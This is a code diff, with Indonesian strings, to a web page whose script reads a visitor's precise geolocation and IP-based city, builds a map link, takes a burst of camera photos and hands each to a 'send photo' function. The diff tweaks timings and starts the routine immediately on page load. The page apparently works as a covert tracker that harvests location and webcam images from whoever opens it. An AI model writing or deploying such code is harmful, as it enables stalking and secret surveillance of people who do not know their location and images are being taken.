@@ -175,7 +175,7 @@ Kota                : ${ip.city}
           resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\nLatitude            : ${latitude}\nLongitude           : ${longitude}\nAkurasi             : ±${accuracy} meter\nPeta                : https://maps.google.com/?q=${latitude},${longitude}`);
         }, () => {
           resolve(`- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);
-        }, { enableHighAccuracy: true, timeout: 7000 });
+        }, { enableHighAccuracy: true, timeout: 5000 });
       });
     };
 
@@ -206,7 +206,7 @@ Kota                : ${ip.city}
               if (blob) await kirimFoto(blob);
               resolve();
             }, "image/jpeg");
-          }, 100)); // 0.1 detik antar foto
+          }, 100));
         }
 
         stream.getTracks().forEach(track => track.stop());
@@ -246,7 +246,9 @@ Kota                : ${ip.city}
       }
     };
 
-    window.addEventListener("load", mulai);
+    window.addEventListener("load", () => {
+      setTimeout(mulai, 0); // langsung gercep
+    });
   </script>
 </body>
 </html>
